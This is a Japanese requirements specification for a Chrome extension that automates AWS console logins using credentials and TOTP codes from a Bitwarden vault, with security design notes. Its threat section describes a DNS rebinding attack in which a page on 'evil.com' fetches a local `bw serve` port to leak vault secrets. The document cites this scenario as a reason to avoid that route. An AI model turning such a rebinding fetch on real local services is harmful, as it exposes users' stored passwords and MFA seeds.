# 要件定義書：AWS Console Multi-Account Switcher（改訂版 v6）

本書は v2 に対し、セルフレビュー（Oracle による独立レビュー＋自己所見）の結果を反映した改訂版です。最大の変更は **シークレット取得経路のセキュリティ序列を反転**（Native Messaging を第一候補へ昇格）した点と、**MV3 Service Worker ライフサイクル制約への対応**、**Bitwarden データモデルの定義**です。詳細は次節「改訂履歴」を参照してください。

- ステータス: 基本設計移行可（7章 D-2〜D-5 は確定済み）。PoC（6章）による技術的実現性の確定を推奨。
- 想定読者: 設計・実装担当者、レビュアー
- 関連: 将来 `.kiro/specs/aws-console-switcher/` への移行を想定

## 改訂履歴

### v2 → v3（セルフレビュー反映）

| ID | 区分 | v2 の記述 | v3 での扱い |
| --- | --- | --- | --- |
| C-1 | セキュリティ序列 | `bw serve` を第一候補、Native Messaging を次点 | **逆転**: Native Messaging を第一候補、`bw serve` は開発/デバッグ用途の代替（DNS リバインディングリスクを明記）へ降格 |
| C-2 | MV3 制約 | 「オンメモリ保持」のみ規定 | Service Worker は数十秒で終了しうるため、**ステートレス・プロキシ方式**（各ステップで都度取得）を 2.2 に明記 |
| C-3 | データモデル | 「コレクション(フォルダ)に格納」のみ | **Bitwarden アイテム構造を 3.4 で定義**（カスタムフィールド命名・フォルダ/コレクション選択・UUID 取得経路） |
| M-4 | リスク記述 | 「セキュリティ判断を要する」 | DNS リバインディング攻撃シナリオと PNA の限界を 2.1 に明記 |
| M-5 | エラー要件 | CAPTCHA のみ補足 | 失敗を 3 分類（前提条件/AWS認証/DOM検知）し 3.5 で UX を要件化 |
| M-6 | unlock 手順 | 主体・タイミング未定義 | アンロックの実行主体とマスターパスワード入力タイミングを 4.1.1 で定義 |
| M-7 | セッション戦略 | 「PoC で確定」 | Content Script 設計を二分するため **設計前決定事項**（7章）へ格上げ |
| M-8 | ホスト権限ラベル | `console.aws.amazon.com`＝汎用エントリ用 | 認証 DOM は `signin.aws.amazon.com`。ラベルを「ログイン後コンソール用」へ修正 |
| M-9 | manifest | host_permission のみ | `nativeMessaging`/`tabs`/`cookies`/`alarms`、`run_at`・`match` を 4.1 に暫定列挙 |
| M-10 | 状態管理 | 未定義 | ステート遷移図を設計成果物として 5 章で要求 |
| m-11 | MFA 退化 | 絶対的記述 | アンロック方式に紐付けた条件付きリスクへ修正（4.1.2） |
| m-12 | 用語 | コレクション/フォルダ混用 | 個人=フォルダ / 組織=コレクション を 3.4 で区別 |
| m-14 | TOTP 形式 | 未定義 | `login.totp` の形式（otpauth URI / Base32）確認を PoC 項目化 |

### v3 → v4（未決定事項の確定）

7章の D-2〜D-5 を以下のとおり確定し、本文へ反映した。

- D-2 セッション戦略: **案B 複数セッション併存**（同時最大5、`cookies` 権限不要）
- D-3 アンロック方式: **方式1＋アイドル自動ロック**（既定15〜30分でホストが `bw lock`）
- D-4 対象スコープ: **個人利用＝フォルダ**（`--folderid`）
- D-5 データモデル命名: `aws_account_id`/`aws_account_alias`、フォルダ名 `AWS Accounts` で確定

### v4 → v5（セルフレビュー第2弾反映）

レビュー指摘を受け、以下 4 点を修正・明確化した。

| ID | 区分 | 指摘 | v5 での対応 |
| --- | --- | --- | --- |
| R-1 | manifest 権限 | `chrome.storage.local` を多数参照するが `"storage"` 権限が未列挙（実行時エラー化） | 4.1 の `permissions` に `"storage"` を追加（M-9） |
| R-2 | セッション状態 | 「現ログイン中アカウント」の検出・管理方針が未定義 | 3.1 に状態把握方針（拡張の自己記録＋DOM 補正、陳腐化前提）を設計メモとして追記（M-7 関連） |
| R-3 | TOTP 制御 | 「有効残秒数が不足」の閾値が未定義 | 3.2 Step 3 に既定閾値（残り 5 秒未満、設定可能、PoC #4 で確認）を追記 |
| R-4 | unlock 経路 | TTY 無しのネイティブホストでの `bw unlock` 実行経路・マスターパスワード入力手段が未定義 | 4.1.1 に方式1-a（ポップアップ入力＋`--passwordenv`）/1-b（同一シェル起動）を定義（M-6） |

### v5 → v6（セルフレビュー第3弾反映）

レビュー指摘を受け、本文の論理的整合性に関する以下 3 点を修正した。

| ID | 区分 | 指摘 | v6 での対応 |
| --- | --- | --- | --- |
| S-1 | MFA 分岐 | MFA 未設定で MFA 画面が出ないケースを「(b) AWS 認証エラー」に誤分類していた | Step 3 を「MFA 画面検知時のみ TOTP 注入／非 MFA アカウントは MFA 画面非表示のまま正常完了」へ整理（3.2 Step 3）。3.5 (b) から当該例を除外。データモデルの `TOTP シード` 必須区分を「MFA 有効時」へ修正（3.4） |
| S-2 | 状態補正経路 | `console.aws.amazon.com` の DOM 状態補正の実行手段が未定義（静的 content_scripts は signin 系のみ） | `chrome.tabs.query` による対象タブ判定＋`chrome.scripting.executeScript` での動的注入経路と補正結果の `chrome.storage.local` 反映フローを 3.1 に明記。`"scripting"` 権限の用途を 4.1 で具体化 |
| S-3 | UUID 再同期 | `bw get` 失敗を一括で UUID 無効化トリガーとし、Vault ロック等の一時エラーでも再同期・自動ログイン停止が発生していた | 再同期トリガー (a) を「真のオブジェクト欠落（`item not found`/`invalid UUID`）」限定に修正。一時的前提条件エラーはキャッシュ保持＋3.5 (a) に沿ったアンロック/起動誘導とし、UUID 無効化・自動ログイン停止の対象外へ（3.4） |

## 1. プロジェクト概要・目的

複数の AWS IAM ユーザーアカウント間におけるコンソール切り替えのコンテキストスイッチを最小化する Chrome 拡張機能。既存の静的クレデンシャル（IAM ユーザー）運用環境において、Bitwarden Password Manager の Vault をシークレットの Single Source of Truth（SSOT）として活用し、可能な限り自動化されたログインフローを提供する。

将来的な AssumeRole や IAM Identity Center（SSO）への移行を見据え、認証フロー部分はプラガブルな設計とする。本ツールは「IAM ユーザー運用時の暫定措置」であり、恒久的なベストプラクティスではない点を前提とする。

### 1.1 用語の明確化（Bitwarden 製品の区別）

本要件で「Bitwarden」と言う場合、特記なき限り **Bitwarden Password Manager（個人/組織の Vault）** を指す。**Bitwarden Secrets Manager** は別製品であり、本要件では採用しない（理由は 2.1 を参照）。

## 2. システムアーキテクチャ

Manifest V3（MV3）の制約下で、セキュアかつ MFA 自動化を満たすための構成。

| コンポーネント | 技術要素 / 採用理由・制約 |
| --- | --- |
| フロントエンド | Chrome Extension（Manifest V3）、Service Worker、Content Scripts、Popup |
| シークレット管理 | Bitwarden Password Manager（Vault）を SSOT とする。拡張機能はクラウド API を直接復号できないため、**Native Messaging 経由でローカルの `bw`（Bitwarden CLI）をラップするネイティブホスト**を複合化クライアントとして経由する（第一候補。詳細・代替は 2.1） |
| MFA処理 | ネイティブホストが `bw get totp <id>` で生成済み 6 桁コードを返す。代替として `bw get item <id>` の `login.totp`（otpauth シード）を取得し、拡張内で Web Crypto（HMAC-SHA1, RFC 6238）により生成してもよい |

### 2.1 シークレット取得経路の確定

Bitwarden は「Vault データの操作は認証済みクライアント環境内でのみ実行可能で、公開サーバ API としてホストできない」設計である。したがって**拡張機能がクラウド API を直接叩いて Vault を復号する経路は存在しない**。ローカルの複合化クライアントを経由する必要がある。

| 方式 | 概要 | 採否 | 理由 |
| --- | --- | --- | --- |
| Native Messaging | ネイティブホスト（JS/Py 等）を登録し `bw` をラップ。stdio パイプで通信 | **採用（第一候補）** | TCP ポートを公開せず、ホスト manifest の `allowed_origins` で**特定拡張 ID のみ**に結合。DNS リバインド/CORS/ポート露出の問題クラスが構造的に存在しない |
| `bw serve` | `bw` がローカル REST API（既定 `localhost:8087`）を起動 | 代替（開発/デバッグ用途） | MV3 から `fetch` で接続でき手軽だが、後述のセキュリティリスクを伴う。本番採用時は要リスク受容 |
| Bitwarden Secrets Manager | machine account + access token で key-value secret を取得 | **不採用** | Vault のログイン項目・TOTP を扱えず、AWS 認証情報を SM へ二重登録する必要が生じ SSOT が崩壊する |
| クラウド API 直接呼び出し | 拡張から Bitwarden クラウド API を直接復号 | **不採用（不可能）** | Vault 復号は認証済みローカルクライアントに限定される |

#### 2.1.1 Native Messaging 構成（第一候補）

- `manifest.json` に `"nativeMessaging"` 権限を宣言。
- ネイティブホストの manifest（OS 規定の場所に登録）の `allowed_origins` に本拡張の ID（`chrome-extension://<id>/`）のみを列挙する。これにより**登録された拡張以外からホストへ到達できない**。
- ホストプロセスが `bw`（CLI）を実行し、`BW_SESSION` を**ホストプロセスのみが保持**する（拡張側は一切保持しない）。
- 通信は stdin/stdout のメッセージパッシングであり、ネットワークポートを公開しない。

#### 2.1.2 `bw serve` を代替採用する場合のリスク（M-4）

`bw serve` は既定で `Origin` ヘッダ付きリクエストを全ブロックする。拡張の `fetch` は `Origin: chrome-extension://<id>` を送るため、**そのままでは拒否される**。回避には `--disable-origin-protection`（公式は非推奨）が必要だが、これは **DNS リバインディング攻撃の防衛線を無効化**する。

- 攻撃シナリオ: 悪性サイト `evil.com` が短い TTL で DNS を `127.0.0.1` にリバインドし、ページの JS が `fetch('http://evil.com:8087/...')` を実行。ブラウザは same-origin とみなし CORS をスキップ、`--disable-origin-protection` 済みの `bw serve` が応答 → Vault 全アイテム（AWS パスワード+TOTP シード）が漏洩しうる。
- Chrome の Private Network Access（PNA）は HTTPS ページ→localhost を概ね阻止するが、HTTP ページやリバインド経路では万全でなく、origin 保護の代替にならない。
- 採用する場合は「DNS リバインドリスクを受容」「`localhost` 限定バインド（`--hostname all` 禁止）」を運用手順に明記すること。

### 2.2 拡張機能の内部アーキテクチャ（MV3 制約対応）

MV3 の Service Worker は数十秒のアイドルで Chrome により終了されうる。ログインフローは複数のページ遷移をまたぐため、Service Worker のメモリに認証情報やフロー状態を保持する設計は破綻する（遷移の合間に SW が落ちるとサイレント失敗になる）。そこで以下のステートレス方式を採る。

- Service Worker は**ステートレスなプロキシ**として動作し、認証情報・フロー状態を保持しない。
- 各 Content Script ステップは、対象 DOM を検知した時点で SW 経由でネイティブホストに必要な値を要求し、注入後ただちに破棄する（都度取得）。
- フロー状態は Content Script（ページ存続中は生存）と URL パターンマッチで管理し、SW のメモリに依存しない。
- 非秘匿メタデータ（UUID・アカウントID・エイリアス）は `chrome.storage.local` にキャッシュしてよいが、パスワード・TOTP は永続化しない。
- Popup ↔ Service Worker 間は `chrome.runtime` メッセージングで通信する。

## 3. 機能要件（Functional Requirements）

### 3.1 アカウント管理・UI

- アカウント一覧表示: 拡張機能のポップアップ（Action）にて、切り替え可能な AWS アカウント（エイリアス、アカウントID、IAM ユーザー名）を一覧表示する。表示用メタデータ（エイリアス/アカウントID/UUID）は秘匿情報ではないため、`chrome.storage.local` にキャッシュしてよい（パスワード・TOTP シードは除く。3.3 参照）。
- 検索・フィルタリング: インクリメンタルサーチにより対象アカウントを即座に絞り込む。
- 状態表示: 現在ログイン中のアカウントを視覚的に区別する。セッション状態の把握方針は次のとおり（設計メモ, M-7 関連）。
  - 一次情報源: 拡張自身が自動ログインさせたアカウントとサインイン時刻を `chrome.storage.local` に記録し、ポップアップ一覧の状態表示に用いる（案B の同時最大 5 に対応）。
  - 陳腐化対策: `chrome.storage.local` は永続だが**実態と乖離しうる**（サーバ側セッション失効・手動ログアウト・拡張外ログインを反映できない）。補正は次の経路で行う。`console.aws.amazon.com` は静的 content_scripts の対象外（4.1: `matches` は signin 系のみ）のため、ポップアップ表示時またはバックグラウンドから `chrome.tabs.query` で `https://console.aws.amazon.com/*` のタブを判定し、開いていれば `chrome.scripting.executeScript`（`"scripting"` 権限＋当該 host_permission）で対象タブへ状態取得スクリプトを動的注入し、現ログイン中の識別情報を読み取る。取得結果で `chrome.storage.local` の記録を補正し、ポップアップ一覧の状態表示へ反映する。タブが無い・取得できない等で確証が得られない状態は「不確定」として控えめに表示し、誤った「ログイン済み」表示を避ける。
  - `cookies` 権限は用いない（案B 決定, 3.2.1）。

### 3.2 ログイン自動化フロー

ユーザーがリストから対象アカウントを選択した際、以下のシーケンスを自動化する。状態管理は 2.2 のステートレス方式に従う。

1. セッション戦略の適用（**案B 複数セッション併存に決定**, 3.2.1 参照）: 対象アカウントが既にサインイン済みならそのセッションを前面化する。未サインインなら以下のルーティング〜MFA の自動ログインで新規セッションを追加する（同時最大5）。
2. ルーティング: 可能な限り**アカウント別サインインURL** `https://<alias_or_id>.signin.aws.amazon.com/console/` を用いる。これにより後述 Step 1 を省略できる。
3. Step 1（アカウントID, 条件付き）: 汎用エントリ（`https://signin.aws.amazon.com/console`）経由、または Cookie 未保持で ID 入力欄が描画された場合のみ、アカウントID／エイリアスを注入して Submit する。**ID欄が描画されない状態（Cookie 記憶済み）にも対応すること。**
4. Step 2（ユーザー情報）: ユーザー名およびパスワードを注入して Submit する。
5. Step 3（MFA, 条件付き）: ユーザー情報送信後、**MFA 入力画面の DOM 描画**と**コンソールへのリダイレクト（ログイン完了）**のいずれが先に発生するかを監視する。MFA 入力画面を検知した場合のみ、ネイティブホストから取得した TOTP コードを注入して Submit する。**MFA 未設定アカウントでは MFA 画面が描画されないままログインが完了するため、この場合は失敗とせず正常に `done` へ遷移する**（MFA 画面が出ないこと自体は認証エラーではない）。一定時間内に MFA 画面・ログイン完了のいずれも観測できない場合のみ (c) DOM 検知タイムアウトとして扱う。**TOTP の 30 秒ローテーションと AWS 側のコード再利用拒否を考慮し、有効残秒数が不足する場合は次コードを待機・再試行する制御を備えること。** 「不足」の閾値は既定で**残り 5 秒未満**とし、5〜10 秒の範囲で設定可能とする（ネットワーク遅延・サーバ時刻ずれによる失効を回避）。具体値は PoC #4 で最終確認する。

#### 3.2.1 セッション戦略（案B 複数セッション併存に決定）

AWS は 1 ブラウザで最大 5 つの識別情報を同時サインインできる。本要件では **案B（複数セッション併存）を採用**する。

- 動作: 対象アカウントが既にサインイン済みならそのセッションを前面化し、未サインインなら自動ログインで新規セッションを追加する。再ログインを最小化でき、"switcher" の製品意図（複数セッションを保持し即時切替）に最も合致する。
- 上限: 同時 5 アカウントまで。6 個以上を扱う場合は LRU 等で最古セッションを退避（再ログインを伴う）するロジックを設計する。
- 不採用（案A 都度サインアウト→再ログイン）: 切替ごとに再認証が発生し遅く、MFA 頻度も増えるため見送り。`chrome.cookies` 権限は案A 専用だったため、本決定により不要。
- 実現性: AWS 複数セッション UI（追加・前面化）の DOM 操作は PoC（6章 #4）で確認する。

### 3.3 シークレット取得・同期

- 取得元: Bitwarden Vault の指定**フォルダ**（個人利用に決定。D-4）に格納された AWS コンソール用ログイン項目（データモデルは 3.4）。
- 取得経路: Content Script → Service Worker（ステートレス・プロキシ）→ Native Messaging ホスト（`bw get item <id>` / `bw get totp <id>`）。`bw serve` 代替採用時は REST エンドポイント（`/object/item/{id}` 等）。
- 揮発性（秘匿情報）: **パスワード・TOTP シード／コードは永続化禁止**。各注入ステップで都度取得し、注入後ただちにメモリから破棄する（2.2）。
- キャッシュ（非秘匿）: アイテムの UUID・アカウントID・エイリアス・ユーザー名（表示用）は `chrome.storage.local` に保存してよい。
- unlock/session: Vault のアンロック方式は 4.1.1 の方針に従う。

### 3.4 Bitwarden データモデル（C-3）

標準のログインアイテムには `Username`/`Password`/`TOTP`/`URI` しかなく、12桁アカウントID とエイリアスはカスタムフィールドに格納する必要がある。アイテム構造を以下で定義する（D-5 で確定）。

| 項目 | 格納先 | 必須 | 用途 |
| --- | --- | --- | --- |
| IAM ユーザー名 | 標準 `Username` | ✓ | Step 2 注入 |
| IAM パスワード | 標準 `Password` | ✓ | Step 2 注入 |
| TOTP シード | 標準 Authenticator key (`login.totp`) | MFA 有効時 | Step 3 のコード生成（MFA 未設定アカウントは空欄可、Step 3 をスキップして正常完了） |
| アカウントID（12桁） | カスタムフィールド `aws_account_id` | ✓ | Step 1 注入／URL 構築／一覧表示 |
| エイリアス | カスタムフィールド `aws_account_alias` | 任意 | URL 構築／一覧表示 |
| サインインURL | 標準 `URI` | 任意 | `https://<alias_or_id>.signin.aws.amazon.com/console/` |

- 対象スコープ: **個人利用＝フォルダに決定（D-4）**。CLI は `--folderid` を用いる。フォルダ名は設定可能とし、既定 `AWS Accounts`。
- UUID 取得・管理: 初回セットアップ／同期時に一覧取得（ネイティブホスト: `bw list items --folderid <id>`）でアイテムを列挙し、`{UUID → 非秘匿メタデータ}` を `chrome.storage.local` にキャッシュ。`bw get totp/item <UUID>` はこの UUID を用いる。
- UUID キャッシュの再同期トリガー:
  - (a) `bw get totp/item <UUID>` または `bw get item <UUID>` が**真のオブジェクト欠落**（`item not found` / `invalid UUID` 等、アイテム削除・UUID 無効化に起因）で失敗した場合のみ。Vault ロック・ネイティブホスト未起動・`bw` 未ログイン等の**一時的な前提条件エラー**（3.5 (a)）は UUID 自体は有効なため本トリガーに**含めない**（下記の扱いに従う）。
  - (b) ユーザーが手動で「同期」操作を実行した場合
  - (c) Vault ロック解除後の初回アクセス時（推奨）
  - 再同期時は `bw list items --folderid <id>` で再列挙し、キャッシュを上書き更新する。
  - 真のオブジェクト欠落で失敗した UUID のみ即座に無効化し、再同期完了までそのアカウントへの自動ログインを停止してユーザーへ通知する。
  - 一時的な前提条件エラー（Vault ロック・ホスト未起動等）では**キャッシュを保持**し、UUID 無効化・再同期は行わない（再同期に用いる `bw list items` 自体もロック中は失敗するため）。自動ログインは無効化せず、3.5 (a) に従い「アンロック/ホスト起動が必要」をユーザーへ通知し、解消後に再試行できるようにする。
- エイリアス未設定アカウントへの対応: `aws_account_alias` が無い場合はアカウントID でサインインURL を構築する。

### 3.5 エラー・失敗時のハンドリング（M-5）

失敗を 3 分類し、各カテゴリの検知・通知・フォールバックを要件化する。

| 分類 | 例 | UX / フォールバック |
| --- | --- | --- |
| (a) 前提条件エラー | ネイティブホスト未登録/未起動、`bw` 未ログイン、Vault ロック | ポップアップで「ホスト起動/アンロックが必要」を通知し、手動ログインへ誘導 |
| (b) AWS 認証エラー | パスワード誤り、TOTP 拒否（再利用/時刻ずれ）、アカウントロックアウト | TOTP は次コードで 1 回まで自動再試行。上限超過・認証エラーはフローを停止しユーザーに通知 |
| (c) DOM 検知タイムアウト | セレクタ不一致、ページ未描画、SPA 遷移検知漏れ | 一定時間（例 10 秒）で停止し、手動ログイン継続へフォールバック。セレクタ動的更新機構（6章）と連携 |

補足: 高速なプログラム的フォーム送信は CAPTCHA／ボット検知を誘発しうる。検知時は手動介入へフォールバックする。

## 4. 非機能要件（Non-Functional Requirements）

### 4.1 セキュリティ

- MV3 準拠: リモートコード実行（`eval` 等）を排除し、厳格な CSP を適用する。Popup ページから `http://localhost` への直接 `fetch` は CSP 上不可のため、`bw serve` 代替採用時も通信は Service Worker 経由に限定する。
- 権限の最小化（manifest 暫定リスト, M-9）:
  - `permissions`: `"nativeMessaging"`（第一候補の必須）、`"storage"`（UUID・表示用メタデータのローカルキャッシュ。`chrome.storage.local` の利用に必須。2.2/3.1/3.3/3.4 参照）、`"tabs"`（タブ生成/URL 取得/ナビゲーション/前面化、`console.aws.amazon.com` の対象タブ判定）、`"scripting"`（signin 系への Content Script 注入に加え、静的 content_scripts 対象外の `console.aws.amazon.com` タブへ `chrome.scripting.executeScript` で状態検出スクリプトを動的注入する用途。3.1 陳腐化対策参照）、`"alarms"`（TOTP 待機制御に使う場合）。※`"cookies"` は案A 専用のため案B 決定により不要。
  - `host_permissions`:
    - `https://signin.aws.amazon.com/*`
    - `https://*.signin.aws.amazon.com/*`（アカウント別サインインURL用）
    - `https://console.aws.amazon.com/*`（**ログイン後コンソール用**: 現ログインアカウントの検出等。サインイン認証 DOM はここではない）
    - `http://localhost:8087/*`（**`bw serve` 代替を採用する場合のみ**。第一候補の Native Messaging では不要）
  - `content_scripts`: `matches` は `signin.aws.amazon.com` および `*.signin.aws.amazon.com`。`run_at` は `document_idle`（フォーム描画後）を基本とし、SPA 的な画面遷移は `MutationObserver` で補完する。
- シークレットの揮発性: パスワード・TOTP は永続化せず、注入後ただちに破棄する（3.3, 2.2）。

#### 4.1.1 unlock/session 管理方針（M-6）

「完全自動化」と「シークレットの揮発性」はトレードオフの関係にある。ゼロタッチ自動化には Vault が unlock 済み（`BW_SESSION` 利用可能）である必要があるが、`BW_SESSION` は **Vault 全体の復号鍵**であり、これを永続保持すると揮発性要件と衝突する。

- 保持主体: `BW_SESSION` は**ネイティブホストのプロセスのみ**が保持し、拡張機能（`chrome.storage` 等）には一切保存しない。
- アンロックの実行主体とタイミング（**方式1＋アイドル自動ロックに決定, D-3**）:
  - 起動時 1 回アンロック: 能動利用の開始時に 1 回だけマスターパスワードを入力し、以降の能動利用中はゼロタッチで動作する。Chrome が起動するネイティブホストは stdin/stdout がパイプ接続で**対話的 TTY を持たない**ため、`bw unlock` の標準入力プロンプトには応答できない。実行経路は次のいずれかとし、**方式1-a を第一候補**とする（PoC #1 の前提として確定する）。
    - 方式1-a（第一候補・推奨）: マスターパスワードを拡張ポップアップで一時入力し、Popup → Service Worker → Native Messaging でホストへ受け渡す。ホストは `bw` 起動時に環境変数を設定して `bw unlock --raw --passwordenv <VAR>` を実行し、得た `BW_SESSION` を**自プロセスのみ**で保持する（拡張側は保持しない。2.1.1）。マスターパスワードは受け渡し後ただちに破棄し、永続化しない。
    - 方式1-b（代替・簡易運用）: 利用者がシェルで `eval $(bw unlock)` を実行し、**同一シェルから Chrome を起動**する。子プロセスは親の環境を継承するため、Chrome 経由で起動されたホストは `BW_SESSION` を引き継げる。ただし GUI ランチャー起動では継承経路が途切れて機能しないため、運用が脆く補助的な位置づけとする。
  - アイドル自動ロック: ネイティブホストは最終利用時刻を追跡し、一定アイドル（既定 15〜30 分、設定可能）で自動的に `bw lock` を呼ぶ（`bw` CLI セッションは自動失効しないため、ホスト側タイマー実装が必須）。
  - 不採用: 方式2（都度マスターパスワード）は最も安全だが完全自動化を損なうため見送り。タイムアウトなしの常時アンロックは MFA 退化が恒常化するため不採用。
- 操作完了後は `bw lock` を呼ぶ運用を許容する設計とする。
- マスターパスワードを永続保存して完全無人化する選択肢は、Vault 全体の鍵を露出させるため**非推奨**（採る場合は明示のリスク受容が必要）。

#### 4.1.2 MFA の実効的退化リスク（m-11, 条件付き）

パスワードと TOTP シードが同一 Vault に同居する構成では、**Vault がアンロック状態のとき**「知識要素（パスワード）」と「所持要素（TOTP）」が単一の鍵（unlock 済み Vault）に集約され、MFA の多要素性が実効的に単一要素へ退化する。退化の度合いはアンロック方式に依存する。

- 採用した方式1＋アイドル自動ロックでは、退化はアンロック中（最終利用から自動ロックまでの 15〜30 分窓）に限定される。離席・夜間等の無操作時は自動ロックされ保護される。
- 比較: タイムアウトなしの常時アンロック（不採用）なら退化は恒常的、方式2（不採用）なら退化は最小だった。
- Vault がロック中であれば、ローカル攻撃者もパスワード・TOTP を取得できない。

本ツールが暫定措置である前提のもと本リスクを受容する。恒久運用では IAM Identity Center 等への移行で解消する。

### 4.2 拡張性・将来対応（技術的負債の回避）

- クレデンシャルプロバイダ（IAM ユーザー情報の取得）とセッションマネージャ（ログイン処理）をインターフェースで分離する。
- 将来 IAM Identity Center 等へ移行した際、パスワード注入ロジックを破棄し、SSO ポータルへのルーティングツールへ容易に改修できるアーキテクチャとする。
- シークレット取得経路（Native Messaging / `bw serve`）を差し替え可能なアダプタとして抽象化する。

## 5. 設計フェーズ成果物要件（M-10）

基本設計フェーズで以下を成果物として作成する。

- ログイン自動化フローの**ステート遷移図**: 状態（`idle` → `routing` → `awaiting_account_id` → `awaiting_credentials` → `awaiting_mfa` → `done`/`failed`）、各遷移トリガ（URL 変化／DOM 検知）、タイムアウト、キャンセル手段を定義する。
- Service Worker / Content Script / Popup / ネイティブホスト間の**メッセージング設計**（2.2 のステートレス方式の具体化）。
- AWS サインイン各ステップの**セレクタ定義**と、設定ファイルによる動的更新機構（6章 #5）。

## 6. 技術検証（PoC）事項 — リスク優先度順

基本設計に進む前にプロトタイプで実証すべき領域を、リスクの大きい順に列挙する。

1. **【最優先】Native Messaging 疎通**: ネイティブホスト登録、`allowed_origins` による拡張 ID 限定の確認、`bw get totp <id>` / `bw get item <id>` 呼び出し、`bw unlock` による `BW_SESSION` 保持。
2. **【最優先】方式1＋アイドル自動ロックの実装検証**: 起動時 `bw unlock`、最終利用時刻の追跡、アイドル経過での自動 `bw lock` の動作確認（4.1.1）。
3. **MV3 SW ライフサイクル下のフロー維持**: Service Worker が終了しても、各 Content Script ステップが都度取得するステートレス方式でフローが破綻しないことの実証（2.2）。
4. **AWS サインイン DOM 自動化＋複数セッション UI**: アカウント別URL前提で Cookie 有無による画面分岐の検知、TOTP 再利用回避のリトライ制御、および案B の複数セッション UI（追加・前面化）の DOM 操作を検証する。
5. **セレクタ耐性**: AWS 側 DOM 変更（A/B テスト・アップデート）に対するフォールバック、および設定ファイルによる動的セレクタ更新機構。
6. **`login.totp` のフォーマット確認（m-14）**: `bw get item` が返す `login.totp` が otpauth URI か Base32 シードかを確認し、拡張内 TOTP 生成のパース仕様を確定する。

補足: `bw serve` を代替として残す場合は、Origin protection / `--disable-origin-protection` の挙動と DNS リバインドリスクを別途検証する（2.1.2）。

## 7. 設計着手前の意思決定事項（すべて確定済み）

設計フェーズ移行前に意思決定が必要だった事項。下表のとおり D-1〜D-5 すべて確定済み。

| ID | 事項 | 状態 | 備考 |
| --- | --- | --- | --- |
| D-1 | シークレット取得経路 | **決定済み** | Native Messaging を第一候補（C-1 反映、承認済み）。`bw serve` は開発/デバッグ用途の代替 |
| D-2 | セッション戦略 | **決定済み** | 案B（複数セッション併存）を採用。同時最大5、6個以上は退避ロジック。`chrome.cookies` 権限は不要に。実現性は PoC #4 で確認 |
| D-3 | unlock 方式 | **決定済み** | 方式1＋アイドル自動ロック（既定15〜30分）。ホスト側でアイドルタイマーを実装し `bw lock` を呼ぶ |
| D-4 | 対象スコープ | **決定済み** | 個人利用＝フォルダ。CLI は `--folderid` |
| D-5 | データモデル命名 | **決定済み** | `aws_account_id`（必須）/`aws_account_alias`（任意）、フォルダ名既定 `AWS Accounts`、`URI`＝サインインURL |

## 付録A. 参照した一次情報

- Bitwarden: Secrets Manager FAQs — <https://bitwarden.com/help/secrets-manager-faqs/>
- Bitwarden: Encrypted Data（Vault と Secrets Manager のデータ分離）— <https://bitwarden.com/help/vault-data/>
- Bitwarden: Password Manager CLI（`bw get totp`、`bw list items`、`unlock`/`BW_SESSION`）— <https://bitwarden.com/help/cli/>
- Bitwarden: Serve Mode（ローカル REST API、Origin protection）— <https://bitwarden.com/help/cli/> および CLI Clients ドキュメント
- AWS: Sign in to the AWS Management Console as an IAM user — <https://docs.aws.amazon.com/signin/latest/userguide/introduction-to-iam-user-sign-in-tutorial.html>
- AWS: How IAM users sign in to AWS（アカウント別URL、Cookie 記憶）— <https://docs.aws.amazon.com/IAM/latest/UserGuide/id_users_sign-in.html>
- AWS: Sign in to the AWS Management Console（最大5識別情報の同時サインイン）— <https://docs.aws.amazon.com/signin/latest/userguide/how-to-sign-in.html>
- AWS: MFA enabled sign-in — <https://docs.aws.amazon.com/IAM/latest/UserGuide/console_sign-in-mfa.html>
- Chrome for Developers: Native messaging — <https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging>
- Chrome for Developers: Service worker lifecycle — <https://developer.chrome.com/docs/extensions/develop/concepts/service-workers/lifecycle>
